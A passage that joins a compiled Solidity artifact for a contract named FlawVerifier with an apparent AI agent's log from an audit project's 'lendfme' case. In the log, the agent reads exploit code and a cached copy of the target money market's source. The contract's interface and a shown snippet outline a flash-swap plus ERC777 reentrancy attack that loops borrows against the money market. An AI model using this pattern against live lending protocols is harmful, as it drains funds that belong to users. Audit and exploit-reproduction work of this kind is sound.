:::o;7839:159::-;7979:11;7975:1;7967:6;7963:14;7956:35;7839:159;:::o;8004:365::-;8146:3;8167:66;8231:1;8226:3;8167:66;:::i;:::-;8160:73;;8242:93;8331:3;8242:93;:::i;:::-;8360:2;8355:3;8351:12;8344:19;;8004:365;;;:::o;8375:419::-;8541:4;8579:2;8568:9;8564:18;8556:26;;8628:9;8622:4;8618:20;8614:1;8603:9;8599:17;8592:47;8656:131;8782:4;8656:131;:::i;:::-;8648:139;;8375:419;;;:::o;8800:143::-;8857:5;8888:6;8882:13;8873:22;;8904:33;8931:5;8904:33;:::i;:::-;8800:143;;;;:::o;8949:351::-;9019:6;9068:2;9056:9;9047:7;9043:23;9039:32;9036:119;;;9074:79;;:::i;:::-;9036:119;9194:1;9219:64;9275:7;9266:6;9255:9;9251:22;9219:64;:::i;:::-;9209:74;;9165:128;8949:351;;;;:::o;9306:162::-;9446:14;9442:1;9434:6;9430:14;9423:38;9306:162;:::o;9474:366::-;9616:3;9637:67;9701:2;9696:3;9637:67;:::i;:::-;9630:74;;9713:93;9802:3;9713:93;:::i;:::-;9831:2;9826:3;9822:12;9815:19;;9474:366;;;:::o;9846:419::-;10012:4;10050:2;10039:9;10035:18;10027:26;;10099:9;10093:4;10089:20;10085:1;10074:9;10070:17;10063:47;10127:131;10253:4;10127:131;:::i;:::-;10119:139;;9846:419;;;:::o;10271:163::-;10411:15;10407:1;10399:6;10395:14;10388:39;10271:163;:::o;10440:366::-;10582:3;10603:67;10667:2;10662:3;10603:67;:::i;:::-;10596:74;;10679:93;10768:3;10679:93;:::i;:::-;10797:2;10792:3;10788:12;10781:19;;10440:366;;;:::o;10812:419::-;10978:4;11016:2;11005:9;11001:18;10993:26;;11065:9;11059:4;11055:20;11051:1;11040:9;11036:17;11029:47;11093:131;11219:4;11093:131;:::i;:::-;11085:139;;10812:419;;;:::o;11237:143::-;11294:5;11325:6;11319:13;11310:22;;11341:33;11368:5;11341:33;:::i;:::-;11237:143;;;;:::o;11386:351::-;11456:6;11505:2;11493:9;11484:7;11480:23;11476:32;11473:119;;;11511:79;;:::i;:::-;11473:119;11631:1;11656:64;11712:7;11703:6;11692:9;11688:22;11656:64;:::i;:::-;11646:74;;11602:128;11386:351;;;;:::o;11743:162::-;11883:14;11879:1;11871:6;11867:14;11860:38;11743:162;:::o;11911:366::-;12053:3;12074:67;12138:2;12133:3;12074:67;:::i;:::-;12067:74;;12150:93;12239:3;12150:93;:::i;:::-;12268:2;12263:3;12259:12;12252:19;;11911:366;;;:::o;12283:419::-;12449:4;12487:2;12476:9;12472:18;12464:26;;12536:9;12530:4;12526:20;12522:1;12511:9;12507:17;12500:47;12564:131;12690:4;12564:131;:::i;:::-;12556:139;;12283:419;;;:::o;12708:180::-;12756:77;12753:1;12746:88;12853:4;12850:1;12843:15;12877:4;12874:1;12867:15;12894:191;12934:3;12953:20;12971:1;12953:20;:::i;:::-;12948:25;;12987:20;13005:1;12987:20;:::i;:::-;12982:25;;13030:1;13027;13023:9;13016:16;;13051:3;13048:1;13045:10;13042:36;;;13058:18;;:::i;:::-;13042:36;12894:191;;;;:::o;13091:159::-;13231:11;13227:1;13219:6;13215:14;13208:35;13091:159;:::o;13256:365::-;13398:3;13419:66;13483:1;13478:3;13419:66;:::i;:::-;13412:73;;13494:93;13583:3;13494:93;:::i;:::-;13612:2;13607:3;13603:12;13596:19;;13256:365;;;:::o;13627:419::-;13793:4;13831:2;13820:9;13816:18;13808:26;;13880:9;13874:4;13870:20;13866:1;13855:9;13851:17;13844:47;13908:131;14034:4;13908:131;:::i;:::-;13900:139;;13627:419;;;:::o;14052:332::-;14173:4;14211:2;14200:9;14196:18;14188:26;;14224:71;14292:1;14281:9;14277:17;14268:6;14224:71;:::i;:::-;14305:72;14373:2;14362:9;14358:18;14349:6;14305:72;:::i;:::-;14052:332;;;;;:::o;14390:98::-;14441:6;14475:5;14469:12;14459:22;;14390:98;;;:::o;14494:147::-;14595:11;14632:3;14617:18;;14494:147;;;;:::o;14647:139::-;14736:6;14731:3;14726;14720:23;14777:1;14768:6;14763:3;14759:16;14752:27;14647:139;;;:::o;14792:386::-;14896:3;14924:38;14956:5;14924:38;:::i;:::-;14978:88;15059:6;15054:3;14978:88;:::i;:::-;14971:95;;15075:65;15133:6;15128:3;15121:4;15114:5;15110:16;15075:65;:::i;:::-;15165:6;15160:3;15156:16;15149:23;;14900:278;14792:386;;;;:::o;15184:271::-;15314:3;15336:93;15425:3;15416:6;15336:93;:::i;:::-;15329:100;;15446:3;15439:10;;15184:271;;;;:::o;15461:168::-;15601:20;15597:1;15589:6;15585:14;15578:44;15461:168;:::o;15635:366::-;15777:3;15798:67;15862:2;15857:3;15798:67;:::i;:::-;15791:74;;15874:93;15963:3;15874:93;:::i;:::-;15992:2;15987:3;15983:12;15976:19;;15635:366;;;:::o;16007:419::-;16173:4;16211:2;16200:9;16196:18;16188:26;;16260:9;16254:4;16250:20;16246:1;16235:9;16231:17;16224:47;16288:131;16414:4;16288:131;:::i;:::-;16280:139;;16007:419;;;:::o;16432:171::-;16572:23;16568:1;16560:6;16556:14;16549:47;16432:171;:::o;16609:366::-;16751:3;16772:67;16836:2;16831:3;16772:67;:::i;:::-;16765:74;;16848:93;16937:3;16848:93;:::i;:::-;16966:2;16961:3;16957:12;16950:19;;16609:366;;;:::o;16981:419::-;17147:4;17185:2;17174:9;17170:18;17162:26;;17234:9;17228:4;17224:20;17220:1;17209:9;17205:17;17198:47;17262:131;17388:4;17262:131;:::i;:::-;17254:139;;16981:419;;;:::o;17406:180::-;17454:77;17451:1;17444:88;17551:4;17548:1;17541:15;17575:4;17572:1;17565:15;17592:185;17632:1;17649:20;17667:1;17649:20;:::i;:::-;17644:25;;17683:20;17701:1;17683:20;:::i;:::-;17678:25;;17722:1;17712:35;;17727:18;;:::i;:::-;17712:35;17769:1;17766;17762:9;17757:14;;17592:185;;;;:::o;17783:168::-;17923:20;17919:1;17911:6;17907:14;17900:44;17783:168;:::o;17957:366::-;18099:3;18120:67;18184:2;18179:3;18120:67;:::i;:::-;18113:74;;18196:93;18285:3;18196:93;:::i;:::-;18314:2;18309:3;18305:12;18298:19;;17957:366;;;:::o;18329:419::-;18495:4;18533:2;18522:9;18518:18;18510:26;;18582:9;18576:4;18572:20;18568:1;18557:9;18553:17;18546:47;18610:131;18736:4;18610:131;:::i;:::-;18602:139;;18329:419;;;:::o;18754:194::-;18794:4;18814:20;18832:1;18814:20;:::i;:::-;18809:25;;18848:20;18866:1;18848:20;:::i;:::-;18843:25;;18892:1;18889;18885:9;18877:17;;18916:1;18910:4;18907:11;18904:37;;;18921:18;;:::i;:::-;18904:37;18754:194;;;;:::o;18954:410::-;18994:7;19017:20;19035:1;19017:20;:::i;:::-;19012:25;;19051:20;19069:1;19051:20;:::i;:::-;19046:25;;19106:1;19103;19099:9;19128:30;19146:11;19128:30;:::i;:::-;19117:41;;19307:1;19298:7;19294:15;19291:1;19288:22;19268:1;19261:9;19241:83;19218:139;;19337:18;;:::i;:::-;19218:139;19002:362;18954:410;;;;:::o;19370:163::-;19510:15;19506:1;19498:6;19494:14;19487:39;19370:163;:::o;19539:366::-;19681:3;19702:67;19766:2;19761:3;19702:67;:::i;:::-;19695:74;;19778:93;19867:3;19778:93;:::i;:::-;19896:2;19891:3;19887:12;19880:19;;19539:366;;;:::o;19911:419::-;20077:4;20115:2;20104:9;20100:18;20092:26;;20164:9;20158:4;20154:20;20150:1;20139:9;20135:17;20128:47;20192:131;20318:4;20192:131;:::i;:::-;20184:139;;19911:419;;;:::o;20336:168::-;20476:20;20472:1;20464:6;20460:14;20453:44;20336:168;:::o;20510:366::-;20652:3;20673:67;20737:2;20732:3;20673:67;:::i;:::-;20666:74;;20749:93;20838:3;20749:93;:::i;:::-;20867:2;20862:3;20858:12;20851:19;;20510:366;;;:::o;20882:419::-;21048:4;21086:2;21075:9;21071:18;21063:26;;21135:9;21129:4;21125:20;21121:1;21110:9;21106:17;21099:47;21163:131;21289:4;21163:131;:::i;:::-;21155:139;;20882:419;;;:::o;21307:85::-;21352:7;21381:5;21370:16;;21307:85;;;:::o;21398:60::-;21426:3;21447:5;21440:12;;21398:60;;;:::o;21464:158::-;21522:9;21555:61;21573:42;21582:32;21608:5;21582:32;:::i;:::-;21573:42;:::i;:::-;21555:61;:::i;:::-;21542:74;;21464:158;;;:::o;21628:147::-;21723:45;21762:5;21723:45;:::i;:::-;21718:3;21711:58;21628:147;;:::o;21781:458::-;21938:4;21976:2;21965:9;21961:18;21953:26;;21989:71;22057:1;22046:9;22042:17;22033:6;21989:71;:::i;:::-;22070:80;22146:2;22135:9;22131:18;22122:6;22070:80;:::i;:::-;22160:72;22228:2;22217:9;22213:18;22204:6;22160:72;:::i;:::-;21781:458;;;;;;:::o;22245:176::-;22385:28;22381:1;22373:6;22369:14;22362:52;22245:176;:::o;22427:366::-;22569:3;22590:67;22654:2;22649:3;22590:67;:::i;:::-;22583:74;;22666:93;22755:3;22666:93;:::i;:::-;22784:2;22779:3;22775:12;22768:19;;22427:366;;;:::o;22799:419::-;22965:4;23003:2;22992:9;22988:18;22980:26;;23052:9;23046:4;23042:20;23038:1;23027:9;23023:17;23016:47;23080:131;23206:4;23080:131;:::i;:::-;23072:139;;22799:419;;;:::o;23224:90::-;23258:7;23301:5;23294:13;23287:21;23276:32;;23224:90;;;:::o;23320:116::-;23390:21;23405:5;23390:21;:::i;:::-;23383:5;23380:32;23370:60;;23426:1;23423;23416:12;23370:60;23320:116;:::o;23442:137::-;23496:5;23527:6;23521:13;23512:22;;23543:30;23567:5;23543:30;:::i;:::-;23442:137;;;;:::o;23585:345::-;23652:6;23701:2;23689:9;23680:7;23676:23;23672:32;23669:119;;;23707:79;;:::i;:::-;23669:119;23827:1;23852:61;23905:7;23896:6;23885:9;23881:22;23852:61;:::i;:::-;23842:71;;23798:125;23585:345;;;;:::o;23936:165::-;24076:17;24072:1;24064:6;24060:14;24053:41;23936:165;:::o;24107:366::-;24249:3;24270:67;24334:2;24329:3;24270:67;:::i;:::-;24263:74;;24346:93;24435:3;24346:93;:::i;:::-;24464:2;24459:3;24455:12;24448:19;;24107:366;;;:::o;24479:419::-;24645:4;24683:2;24672:9;24668:18;24660:26;;24732:9;24726:4;24722:20;24718:1;24707:9;24703:17;24696:47;24760:131;24886:4;24760:131;:::i;:::-;24752:139;;24479:419;;;:::o;24904:77::-;24941:7;24970:5;24959:16;;24904:77;;;:::o;24987:118::-;25074:24;25092:5;25074:24;:::i;:::-;25069:3;25062:37;24987:118;;:::o;25111:442::-;25260:4;25298:2;25287:9;25283:18;25275:26;;25311:71;25379:1;25368:9;25364:17;25355:6;25311:71;:::i;:::-;25392:72;25460:2;25449:9;25445:18;25436:6;25392:72;:::i;:::-;25474;25542:2;25531:9;25527:18;25518:6;25474:72;:::i;:::-;25111:442;;;;;;:::o;25559:1599::-;25698:6;25706;25714;25722;25730;25738;25746;25754;25762;25811:3;25799:9;25790:7;25786:23;25782:33;25779:120;;;25818:79;;:::i;:::-;25779:120;25938:1;25963:61;26016:7;26007:6;25996:9;25992:22;25963:61;:::i;:::-;25953:71;;25909:125;26073:2;26099:64;26155:7;26146:6;26135:9;26131:22;26099:64;:::i;:::-;26089:74;;26044:129;26212:2;26238:64;26294:7;26285:6;26274:9;26270:22;26238:64;:::i;:::-;26228:74;;26183:129;26351:2;26377:64;26433:7;26424:6;26413:9;26409:22;26377:64;:::i;:::-;26367:74;;26322:129;26490:3;26517:64;26573:7;26564:6;26553:9;26549:22;26517:64;:::i;:::-;26507:74;;26461:130;26630:3;26657:64;26713:7;26704:6;26693:9;26689:22;26657:64;:::i;:::-;26647:74;;26601:130;26770:3;26797:64;26853:7;26844:6;26833:9;26829:22;26797:64;:::i;:::-;26787:74;;26741:130;26910:3;26937:64;26993:7;26984:6;26973:9;26969:22;26937:64;:::i;:::-;26927:74;;26881:130;27050:3;27077:64;27133:7;27124:6;27113:9;27109:22;27077:64;:::i;:::-;27067:74;;27021:130;25559:1599;;;;;;;;;;;:::o;27164:160::-;27304:12;27300:1;27292:6;27288:14;27281:36;27164:160;:::o;27330:366::-;27472:3;27493:67;27557:2;27552:3;27493:67;:::i;:::-;27486:74;;27569:93;27658:3;27569:93;:::i;:::-;27687:2;27682:3;27678:12;27671:19;;27330:366;;;:::o;27702:419::-;27868:4;27906:2;27895:9;27891:18;27883:26;;27955:9;27949:4;27945:20;27941:1;27930:9;27926:17;27919:47;27983:131;28109:4;27983:131;:::i;:::-;27975:139;;27702:419;;;:::o;28127:168::-;28210:11;28244:6;28239:3;28232:19;28284:4;28279:3;28275:14;28260:29;;28127:168;;;;:::o;28301:102::-;28342:6;28393:2;28389:7;28384:2;28377:5;28373:14;28369:28;28359:38;;28301:102;;;:::o;28409:373::-;28495:3;28523:38;28555:5;28523:38;:::i;:::-;28577:70;28640:6;28635:3;28577:70;:::i;:::-;28570:77;;28656:65;28714:6;28709:3;28702:4;28695:5;28691:16;28656:65;:::i;:::-;28746:29;28768:6;28746:29;:::i;:::-;28741:3;28737:39;28730:46;;28499:283;28409:373;;;;:::o;28788:640::-;28983:4;29021:3;29010:9;29006:19;28998:27;;29035:71;29103:1;29092:9;29088:17;29079:6;29035:71;:::i;:::-;29116:72;29184:2;29173:9;29169:18;29160:6;29116:72;:::i;:::-;29198;29266:2;29255:9;29251:18;29242:6;29198:72;:::i;:::-;29317:9;29311:4;29307:20;29302:2;29291:9;29287:18;29280:48;29345:76;29416:4;29407:6;29345:76;:::i;:::-;29337:84;;28788:640;;;;;;;:::o;29434:164::-;29574:16;29570:1;29562:6;29558:14;29551:40;29434:164;:::o;29604:366::-;29746:3;29767:67;29831:2;29826:3;29767:67;:::i;:::-;29760:74;;29843:93;29932:3;29843:93;:::i;:::-;29961:2;29956:3;29952:12;29945:19;;29604:366;;;:::o;29976:419::-;30142:4;30180:2;30169:9;30165:18;30157:26;;30229:9;30223:4;30219:20;30215:1;30204:9;30200:17;30193:47;30257:131;30383:4;30257:131;:::i;:::-;30249:139;;29976:419;;;:::o;30401:180::-;30449:77;30446:1;30439:88;30546:4;30543:1;30536:15;30570:4;30567:1;30560:15;30587:332;30708:4;30746:2;30735:9;30731:18;30723:26;;30759:71;30827:1;30816:9;30812:17;30803:6;30759:71;:::i;:::-;30840:72;30908:2;30897:9;30893:18;30884:6;30840:72;:::i;:::-;30587:332;;;;;:::o;30925:114::-;30962:7;31002:30;30995:5;30991:42;30980:53;;30925:114;;;:::o;31045:122::-;31118:24;31136:5;31118:24;:::i;:::-;31111:5;31108:35;31098:63;;31157:1;31154;31147:12;31098:63;31045:122;:::o;31173:143::-;31230:5;31261:6;31255:13;31246:22;;31277:33;31304:5;31277:33;:::i;:::-;31173:143;;;;:::o;31322:93::-;31358:7;31398:10;31391:5;31387:22;31376:33;;31322:93;;;:::o;31421:120::-;31493:23;31510:5;31493:23;:::i;:::-;31486:5;31483:34;31473:62;;31531:1;31528;31521:12;31473:62;31421:120;:::o;31547:141::-;31603:5;31634:6;31628:13;31619:22;;31650:32;31676:5;31650:32;:::i;:::-;31547:141;;;;:::o;31694:661::-;31781:6;31789;31797;31846:2;31834:9;31825:7;31821:23;31817:32;31814:119;;;31852:79;;:::i;:::-;31814:119;31972:1;31997:64;32053:7;32044:6;32033:9;32029:22;31997:64;:::i;:::-;31987:74;;31943:128;32110:2;32136:64;32192:7;32183:6;32172:9;32168:22;32136:64;:::i;:::-;32126:74;;32081:129;32249:2;32275:63;32330:7;32321:6;32310:9;32306:22;32275:63;:::i;:::-;32265:73;;32220:128;31694:661;;;;;:::o","linkReferences":{}},"methodIdentifiers":{"executeFlashswap(uint256)":"43886562","executeOnOpportunity()":"3c2448ed","profitAmount()":"5ff972cc","profitToken()":"49343624","tokensReceived(address,address,address,uint256,bytes,bytes)":"0023de29","tokensToSend(address,address,address,uint256,bytes,bytes)":"75ab9782","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"loanAmount\",\"type\":\"uint256\"}],\"name\":\"executeFlashswap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeOnOpportunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"tokensReceived\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"tokensToSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"uniswapV2Call\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"FlawVerifier\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0xe6e4fe32654d91af86546804af2105dc3214ae8f133bdcd9971b5a5ec8bf887f\",\"urls\":[\"bzz-raw://2b6c24217e914c8b253223c23e544eeb8c885d8c150831ffb2c5bbfdbd6d4dd5\",\"dweb:/ipfs/QmdHmjgEJDxDw3jkaw9ssBvyG1WQPfGVY1x4je9g4JcjcF\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"loanAmount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"executeFlashswap"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"executeOnOpportunity"},{"inputs":[],"stateMutability":"view","type":"function","name":"profitAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"},{"internalType":"bytes","name":"","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"tokensReceived"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"},{"internalType":"bytes","name":"","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"tokensToSend"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"amount0","type":"uint256"},{"internalType":"uint256","name":"amount1","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"uniswapV2Call"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"FlawVerifier"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0xe6e4fe32654d91af86546804af2105dc3214ae8f133bdcd9971b5a5ec8bf887f","urls":["bzz-raw://2b6c24217e914c8b253223c23e544eeb8c885d8c150831ffb2c5bbfdbd6d4dd5","dweb:/ipfs/QmdHmjgEJDxDw3jkaw9ssBvyG1WQPfGVY1x4je9g4JcjcF"],"license":null}},"version":1},"id":0}
+codex
+The artifact points to a V2 flashswap approach, so I’m reading the rest of the file and checking if that path was partly overwritten.
+exec
+/bin/bash -lc "sed -n '261,560p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+        address,
+        address from,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
+            return;
+        }
+        if (from != address(MONEY_MARKET) || to != address(this)) {
+            return;
+        }
+
+        if (remainingBorrowLoops > 1) {
+            unchecked {
+                remainingBorrowLoops -= 1;
+            }
+
+            bool ok = _tryBorrow(activeToken, borrowUnit);
+codex
+I’m checking the cached on-chain snapshots next; they may reveal market/oracle constraints without external access.
+exec
+/bin/bash -lc "find onchain_auto -maxdepth 3 -type f | sed -n '1,120p' && printf '\\n---\\n' && rg -n \"3212b29E|0x0eEe3E|oracle|closeFactor|collateral|liquidation|price|market\" onchain_auto -g '"'!*.bin'"'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 52ms:
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/_etherscan_meta.json
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol
+onchain_auto/_index.json
+
+---
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:5:      * @notice Gets the price of a given asset
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:6:      * @dev fetches the price of a given asset
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:7:      * @param asset Asset to get the price of
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:8:      * @return the price scaled by 10**18, or zero if the price is not available
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:152:      * @dev use this when reporting a known error from the money market or a non-upgradeable collaborator
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:178:      * @param cash The total cash of the asset in the market
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:179:      * @param borrows The total borrows of the asset in the market
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:189:      * @param cash The total cash of the asset in the market
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:190:      * @param borrows The total borrows of the asset in the market
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:654:        collateralRatio = Exp({mantissa: 2 * mantissaOne});
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:656:        liquidationDiscount = Exp({mantissa: 0});
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:657:        // oracle must be configured via _setOracle
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:679:      * @dev Account allowed to set oracle prices for this contract. Initially set
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:682:    address public oracle;
+onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol:713:      *         isSupported = Whether this market is supported or not (not to be confused with the list of collateral assets)
+codex
+I found the verified money-market source; I’m pulling the exact borrow and liquidity logic now.
+exec
+/bin/bash -lc "sed -n '2538,2668p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1688,1765p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '2120,2245p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 50ms:
+        return (Error.NO_ERROR, truncate(rawResult));
+    }
+
+
+    /**
+      * @notice Users borrow assets from the protocol to their own address
+      * @param asset The market asset to borrow
+      * @param amount The amount to borrow
+      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+      */
+    function borrow(address asset, uint amount) public returns (uint) {
+        if (paused) {
+            return fail(Error.CONTRACT_PAUSED, FailureInfo.BORROW_CONTRACT_PAUSED);
+        }
+        BorrowLocalVars memory localResults;
+        Market storage market = markets[asset];
+        Balance storage borrowBalance = borrowBalances[msg.sender][asset];
+
+        Error err;
+        uint rateCalculationResultCode;
+exec
+/bin/bash -lc "sed -n '2245,2365p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1360,1485p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1728,1760p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+            localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset = min(localResults.currentBorrowBalance_TargetUnderwaterAsset, localResults.discountedBorrowDenominatedCollateral);
+
+            // min1&3&2 = min(min1&3, 2)
+            localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset = min(localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset, localResults.discountedRepayToEvenAmount);
+        } else {
+            // Market is not supported, so we don't need to calculate item 2.
+            localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset = min(localResults.currentBorrowBalance_TargetUnderwaterAsset, localResults.discountedBorrowDenominatedCollateral);
+        }
+
+        // If liquidateBorrowAmount = -1, then closeBorrowAmount_TargetUnderwaterAsset = maxCloseableBorrowAmount_TargetUnderwaterAsset
+        if (requestedAmountClose == uint(-1)) {
+            localResults.closeBorrowAmount_TargetUnderwaterAsset = localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset;
+        } else {
+            localResults.closeBorrowAmount_TargetUnderwaterAsset = requestedAmountClose;
+        }
+
+        // From here on, no more use of `requestedAmountClose`
+
+        // Verify closeBorrowAmount_TargetUnderwaterAsset <= maxCloseableBorrowAmount_TargetUnderwaterAsset
+        if (localResults.closeBorrowAmount_TargetUnderwaterAsset > localResults.maxCloseableBorrowAmount_TargetUnderwaterAsset) {
+exec
+/bin/bash -lc "rg -n \"function calculateAccountLiquidity|function getPriceForAssetAmountMulCollatRatio|function fetchAssetPrice|originationFee|collateralRatio|function getPriceForAssetAmount\" onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '2350,2460p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1120,1215p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1215,1315p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 50ms:
+654:        collateralRatio = Exp({mantissa: 2 * mantissaOne});
+655:        originationFee = Exp({mantissa: defaultOriginationFee});
+751:    Exp public collateralRatio;
+754:      * @dev originationFee for new borrows.
+757:    Exp public originationFee;
+977:    function getPriceForAssetAmount(address asset, uint assetAmount) internal view returns (Error, Exp memory)  {
+992:      *      collateral ratio (i.e., assetAmountWei * collateralRatio * oraclePrice = totalValueInEth).
+993:      *      We will group this as `(oraclePrice * collateralRatio) * assetAmountWei`
+995:    function getPriceForAssetAmountMulCollatRatio(address asset, uint assetAmount) internal view returns (Error, Exp memory)  {
+1009:        (err, scaledPrice) = mulExp(collateralRatio, assetPrice);
+1020:      *      This is simply `(1 + originationFee) * borrowAmount`
+1026:        if (isZeroExp(originationFee)) {
+1030:        (Error err0, Exp memory originationFeeFactor) = addExp(originationFee, Exp({mantissa: mantissaOne}));
